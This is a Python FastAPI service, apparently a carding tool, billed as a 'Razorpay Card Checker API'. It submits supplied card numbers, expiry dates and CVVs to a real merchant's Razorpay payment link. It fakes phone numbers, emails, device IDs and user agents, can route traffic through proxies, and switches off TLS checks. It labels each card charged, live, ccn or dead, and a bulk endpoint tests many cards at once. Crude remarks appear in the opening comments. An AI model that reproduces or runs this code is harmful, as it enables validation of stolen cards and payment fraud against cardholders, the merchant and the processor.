#made by adiii
#menko boobies
#gajarpe
# FastAPI Backend for Razorpay Card Checker

import asyncio
import time, json, re, sys, os
import aiohttp, urllib3
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field, field_validator as validator
from colorama import init, Fore, Style
from fake_useragent import UserAgent
from faker import Faker
from datetime import datetime
import hashlib, string, secrets, base64
import random
from urllib.parse import quote
from typing import Optional, List
from contextlib import asynccontextmanager
import uvicorn

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker()

# Configuration
GATEWAY = "razorpay"
DEFAULT_AMOUNT = 1
PAYMENT_URL = "https://razorpay.me/@holidaymoodsadventure"
AUTH_TOKEN = "technopile"

# Global session
session = None

# Stats tracking
stats = {
    "charged": 0,
    "ccn": 0,
    "live": 0,
    "dead": 0,
    "error": 0,
    "total_requests": 0,
    "start_time": time.time()
}

# ====================== PYDANTIC MODELS ======================
class CardCheckRequest(BaseModel):
    cc: str = Field(..., description="Card number (15-16 digits)")
    mm: str = Field(..., description="Expiry month (MM)")
    yy: str = Field(..., description="Expiry year (YY)")
    cvv: str = Field(..., description="CVV (3-4 digits)")
    auth: str = Field(..., description="Auth token")
    amount: int = Field(default=1, description="Amount in rupees")
    proxy: Optional[str] = Field(None, description="Proxy URL")
    
    @validator('auth')
    def validate_auth(cls, v):
        if v != AUTH_TOKEN:
            raise ValueError('Invalid auth token')
        return v


class BulkCheckRequest(BaseModel):
    cards: List[str] = Field(..., description="List of cards (cc|mm|yy|cvv)")
    auth: str = Field(..., description="Auth token")
    amount: int = Field(default=1, description="Amount in rupees")
    proxy: Optional[str] = Field(None, description="Proxy URL")
    
    @validator('auth')
    def validate_auth(cls, v):
        if v != AUTH_TOKEN:
            raise ValueError('Invalid auth token')
        return v


class CardCheckResponse(BaseModel):
    status: str
    card: str
    message: str
    payment_id: Optional[str] = None
    time_taken: float
    timestamp: str


# ====================== LIFESPAN ======================
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage application lifecycle"""
    global session
    connector = aiohttp.TCPConnector(
        limit=500,
        limit_per_host=50,
        ttl_dns_cache=300,
        use_dns_cache=True,
        keepalive_timeout=30,
    )
    session = aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=30, connect=10)
    )
    print(f"{Fore.GREEN}✓ API Started - Ready for requests{Style.RESET_ALL}")
    yield
    await session.close()
    print(f"{Fore.RED}✗ API Shutdown{Style.RESET_ALL}")


# ====================== FASTAPI APP ======================
app = FastAPI(
    title="Razorpay Card Checker API",
    description="High-performance card validation API",
    version="1.0.0",
    lifespan=lifespan
)


# ====================== UTILITIES ======================
def find_between(content, start, end):
    try:
        start_idx = content.index(start) + len(start)
        end_idx = content.index(end, start_idx)
        return content[start_idx:end_idx]
    except ValueError:
        return ""


def gen_indian_phone():
    first_digit = random.choice(['6', '7', '8', '9'])
    rest = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    return first_digit + rest


def parse_proxy(proxy_input):
    if not proxy_input:
        return None
    try:
        if proxy_input.count(':') == 3 and '@' not in proxy_input:
            split = proxy_input.split(':')
            if split[1].isdigit():
                ip, port, user, pwd = split
                proxy_input = f"http://{user}:{pwd}@{ip}:{port}"
            else:
                user, pwd, ip, port = split
                proxy_input = f"http://{user}:{pwd}@{ip}:{port}"
        elif '@' in proxy_input and '://' not in proxy_input:
            proxy_input = 'http://' + proxy_input
        elif proxy_input.count(':') == 1 and '://' not in proxy_input:
            proxy_input = 'http://' + proxy_input
        return {"http": proxy_input, "https": proxy_input}
    except:
        return None


def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"): return "discover"
    elif card_number.startswith("35"): return "jcb"
    elif card_number.startswith("62"): return "unionpay"
    else: return "unknown"


# ====================== ASYNC CHECK LOGIC ======================
async def check_card_async(cc, mm, yy, cvv, proxy_url=None, amount=1):
    """Async card checking - optimized for API"""
    global session, stats
    stats["total_requests"] += 1
    
    start_time = time.time()
    
    try:
        if not session or session.closed:
            raise Exception("Session not available")
        
        proxies = parse_proxy(proxy_url) if proxy_url else None
        
        if len(yy) == 2:
            year = int("20" + yy)
        else:
            year = int(yy)
        
        brand = get_card_brand(cc)
        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(random.randrange(10**8)).zfill(8)
        rzp_device_id = f"1.{h}.{ts}.{rnd}"
        
        BASE62 = string.ascii_letters + string.digits
        rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
        
        ua_thread = UserAgent().chrome
        phone_full = "+91" + gen_indian_phone()
        phone_short = phone_full[3:]
        email = fake.user_name() + "@gmail.com"
        
        BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
        BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
        
        amo = amount * 100
        
        # Step 1: Get initial data
        try:
            async with session.get(PAYMENT_URL, proxy=proxies, ssl=False) as resp:
                if resp.status != 200:
                    stats["error"] += 1
                    return {"status": "error", "message": f"Site error: {resp.status}", "time_taken": time.time() - start_time}
                text = await resp.text()
            
            json_text = re.search(r'var data = ({.*?});', text, re.DOTALL)
            if not json_text:
                stats["error"] += 1
                return {"status": "error", "message": "Parse error", "time_taken": time.time() - start_time}
            
            init_data = json.loads(json_text.group(1))
            kyid = init_data["key_id"]
            plink = init_data["payment_link"]["id"]
            ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
            keyless_header = init_data.get("keyless_header")
            keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
        except Exception as e:
            stats["error"] += 1
            return {"status": "error", "message": f"Init error: {str(e)[:50]}", "time_taken": time.time() - start_time}
        
        # Step 2: Create order
        try:
            headers_order = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Origin': 'https://pages.razorpay.com',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua_thread,
            }
            json_order = {
                'notes': {'comment': '', 'name': 'API User'},
                'line_items': [{'payment_page_item_id': ppid, 'amount': amo}],
            }
            
            async with session.post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                headers=headers_order,
                json=json_order,
                proxy=proxies,
                ssl=False
            ) as resp:
                if resp.status != 200:
                    stats["error"] += 1
                    return {"status": "error", "message": "Order error", "time_taken": time.time() - start_time}
                order_data = await resp.json()
                order_id = order_data["order"]["id"]
                checkout_id = order_id.split("_")[1]
        except Exception as e:
            stats["error"] += 1
            return {"status": "error", "message": f"Order error: {str(e)[:50]}", "time_taken": time.time() - start_time}
        
        # Step 3: Get public data
        try:
            headers_public = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua_thread,
            }
            params_public = {
                'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
            }
            
            async with session.get(
                'https://api.razorpay.com/v1/checkout/public',
                params=params_public,
                headers=headers_public,
                proxy=proxies,
                ssl=False
            ) as resp:
                public_text = await resp.text()
            
            sessid = find_between(public_text, 'window.session_token="', '";')
            if not sessid:
                match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', public_text)
                if match:
                    sessid = match.group(1)
            
            if not sessid:
                stats["error"] += 1
                return {"status": "error", "message": "No session", "time_taken": time.time() - start_time}
        except Exception as e:
            stats["error"] += 1
            return {"status": "error", "message": f"Public error: {str(e)[:50]}", "time_taken": time.time() - start_time}
        
        # Step 4: Preferences
        try:
            headers_pref = {
                'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}",
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            json_pref = {
                'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'methods', 'order']],
                'query_params': {
                    'device_id': rzp_device_id, 'amount': amo, 'currency': 'INR',
                    'order_id': order_id, 'payment_link_id': plink, 'contact': phone_full,
                },
                'action': 'get',
            }
            async with session.post(
                'https://api.razorpay.com/v2/standard_checkout/preferences',
                params=params_pref,
                headers=headers_pref,
                json=json_pref,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass
        except:
            pass
        
        # Step 5: Create payment
        try:
            headers_create = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            token_create = base64.b64encode(json.dumps([{"name": "sardine"}], separators=(',', ':')).encode()).decode()
            data_create = {
                "user_risk_providers_token": token_create, 'notes[email]': email,
                'notes[phone]': phone_short, 'payment_link_id': plink, 'key_id': kyid,
                'contact': phone_full, 'email': email, 'currency': 'INR',
                'amount': amo, 'order_id': order_id, 'method': 'card',
                'card[number]': cc, 'card[cvv]': cvv, 'card[name]': 'API User',
                'card[expiry_month]': mm.zfill(2), 'card[expiry_year]': year,
                'save': '0', 'dcc_currency': 'INR',
            }
            
            async with session.post(
                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                params=params_create,
                headers=headers_create,
                data=data_create,
                proxy=proxies,
                ssl=False,
                allow_redirects=True
            ) as resp:
                resp_text = await resp.text()
                pay_json = json.loads(resp_text)
                payment_id = pay_json.get("payment_id") or pay_json.get("id")
                
                if not payment_id:
                    stats["dead"] += 1
                    return {"status": "dead", "message": "No payment ID", "time_taken": time.time() - start_time}
        except Exception as e:
            stats["error"] += 1
            return {"status": "error", "message": f"Payment error: {str(e)[:50]}", "time_taken": time.time() - start_time}
        
        # Step 6: Authenticate
        try:
            pid_clean = payment_id.split("_")[1]
            headers_3ds = {"content-type": "application/x-www-form-urlencoded", "user-agent": ua_thread}
            
            async with session.post(
                f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate",
                headers=headers_3ds,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass
            
            await asyncio.sleep(0.2)
            
            browser_data = {
                'browser[java_enabled]': 'false', 'browser[javascript_enabled]': 'true',
                'browser[timezone_offset]': '0', 'browser[color_depth]': '24',
                'browser[screen_width]': '1920', 'browser[screen_height]': '1080',
                'browser[language]': 'en-US', 'auth_step': '3ds2Auth'
            }
            
            async with session.post(
                f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
                headers=headers_3ds,
                data=browser_data,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass
        except:
            pass
        
        # Step 7: Final result
        try:
            headers_fin = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_fin = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            
            async with session.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
                params=params_fin,
                headers=headers_fin,
                proxy=proxies,
                ssl=False
            ) as resp:
                final_text = await resp.text()
                final_json = json.loads(final_text)
        except Exception as e:
            stats["error"] += 1
            return {"status": "error", "message": f"Final error: {str(e)[:50]}", "time_taken": time.time() - start_time}
        
        time_taken = round(time.time() - start_time, 2)
        
        if "razorpay_payment_id" in final_text:
            payment_id_final = final_json.get("razorpay_payment_id", "N/A")
            stats["charged"] += 1
            return {"status": "charged", "message": "Success", "payment_id": payment_id_final, "time_taken": time_taken}
        else:
            error_desc = final_json.get("error", {}).get("description", "Unknown Error")
            msg_lower = error_desc.lower()
            
            if any(k in msg_lower for k in ["insufficient account balance", "maximum transaction limit"]):
                stats["live"] += 1
                return {"status": "live", "message": error_desc, "time_taken": time_taken}
            elif "cvv" in msg_lower or "incorrect" in msg_lower:
                stats["ccn"] += 1
                return {"status": "ccn", "message": error_desc, "time_taken": time_taken}
            else:
                stats["dead"] += 1
                return {"status": "dead", "message": error_desc, "time_taken": time_taken}
    
    except Exception as e:
        stats["error"] += 1
        return {"status": "error", "message": str(e)[:100], "time_taken": round(time.time() - start_time, 2)}


# ====================== ENDPOINTS ======================

@app.post("/check", response_model=CardCheckResponse)
async def check_card(request: CardCheckRequest):
    """Check a single card"""
    try:
        result = await check_card_async(
            cc=request.cc,
            mm=request.mm,
            yy=request.yy,
            cvv=request.cvv,
            proxy_url=request.proxy,
            amount=request.amount
        )
        
        return CardCheckResponse(
            status=result.get("status"),
            card=f"{request.cc[:6]}...{request.cc[-4:]}",
            message=result.get("message"),
            payment_id=result.get("payment_id"),
            time_taken=result.get("time_taken", 0),
            timestamp=datetime.now().isoformat()
        )
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/check-bulk")
async def check_bulk(request: BulkCheckRequest):
    """Check multiple cards concurrently"""
    try:
        tasks = []
        
        for card_str in request.cards:
            parts = card_str.split("|")
            if len(parts) != 4:
                continue
            
            tasks.append(check_card_async(
                cc=parts[0].strip(),
                mm=parts[1].strip(),
                yy=parts[2].strip(),
                cvv=parts[3].strip(),
                proxy_url=request.proxy,
                amount=request.amount
            ))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        formatted_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                formatted_results.append({"status": "error", "message": str(result), "card_index": i})
            else:
                formatted_results.append({**result, "card_index": i})
        
        return {
            "total": len(request.cards),
            "results": formatted_results,
            "stats": {
                "charged": sum(1 for r in formatted_results if r.get("status") == "charged"),
                "live": sum(1 for r in formatted_results if r.get("status") == "live"),
                "ccn": sum(1 for r in formatted_results if r.get("status") == "ccn"),
                "dead": sum(1 for r in formatted_results if r.get("status") == "dead"),
                "errors": sum(1 for r in formatted_results if r.get("status") == "error"),
            },
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/stats")
async def get_stats():
    """Get API statistics"""
    uptime = time.time() - stats["start_time"]
    return {
        "stats": {
            "charged": stats["charged"],
            "live": stats["live"],
            "ccn": stats["ccn"],
            "dead": stats["dead"],
            "errors": stats["error"],
            "total_requests": stats["total_requests"],
        },
        "uptime_seconds": round(uptime, 2),
        "requests_per_second": round(stats["total_requests"] / uptime, 2) if uptime > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }


@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "session_active": session is not None and not session.closed
    }


@app.get("/")
async def root():
    """API documentation"""
    return {
        "name": "Razorpay Card Checker API",
        "version": "1.0.0",
        "endpoints": {
            "POST /check": "Check a single card",
            "POST /check-bulk": "Check multiple cards",
            "GET /stats": "Get statistics",
            "GET /health": "Health check",
            "GET /docs": "API docs"
        },
        "auth": "auth=technopile",
        "example": {
            "cc": "4111111111111111",
            "mm": "12",
            "yy": "25",
            "cvv": "123",
            "auth": "technopile",
            "amount": 1
        }
    }


if __name__ == "__main__":
    uvicorn.run(
        "rzapi_fastapi:app",
        host="0.0.0.0",
        port=8000,
        workers=4,
    )
